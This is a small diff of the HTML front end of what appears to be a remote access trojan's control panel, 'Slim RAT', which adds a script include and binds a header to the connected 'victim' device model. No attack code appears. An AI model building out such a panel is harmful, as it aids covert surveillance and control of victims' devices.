@@ -13,8 +13,8 @@
   <script src="assets/javascripts/vendors/materialize.js"></script>
   <script src="assets/javascripts/vendors/leaflet.js"></script>
   <script src="assets/javascripts/controllers/lab.js"></script>
+  <script src="assets/javascripts/application.js"></script>
   <script>if (window.module) module = window.module;</script>
-  <script>$(document).ready(function(){ $('.nav-extended .tabs').tabs(); });</script>
   <link rel="stylesheet" href="assets/stylesheets/vendors/materialize.css">
   <link rel="stylesheet" href="assets/stylesheets/vendors/leaflet.css">
   <link rel="stylesheet" href="assets/stylesheets/application.css">
@@ -26,7 +26,7 @@
         <img class="logo" src="assets/images/logo.png" alt="Slim RAT">
       </div>
       <ul class="right mr15">
-        <li><span class="device">Device Model</span></li>
+        <li><span class="device" ng-bind="victim.model"></span></li>
         <li><a ng-click="close();"><i class="material-icons">arrow_forward</i></a></li>
       </ul>
     </div>
